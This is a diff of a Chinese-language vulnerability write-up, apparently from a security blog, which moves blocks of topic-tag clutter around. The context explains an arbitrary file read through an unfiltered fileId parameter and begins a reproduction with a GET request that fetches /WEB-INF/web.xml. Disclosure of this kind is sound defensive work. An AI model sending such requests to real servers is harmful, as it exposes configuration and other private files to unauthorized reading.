@@ -51,14 +51,6 @@ v1.6.x
     }
 ```
 
-深入探索
-
-客户关系管理
-
-商务软件和生产力软件
-
-网络设备
-
 跟进 `TheApp.getRootPath` 方法
 
 ```
@@ -72,6 +64,14 @@ public static String getRootPath(String path) {
 对用户可控参数 `fileId` 无任何过滤或校验，直接拼接路径返回文件路径进行文件操作，也是朴实无华的任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。
 
 # 漏洞复现
+
+深入探索
+
+网络
+
+计算机安全
+
+编程
 
 ```
 GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
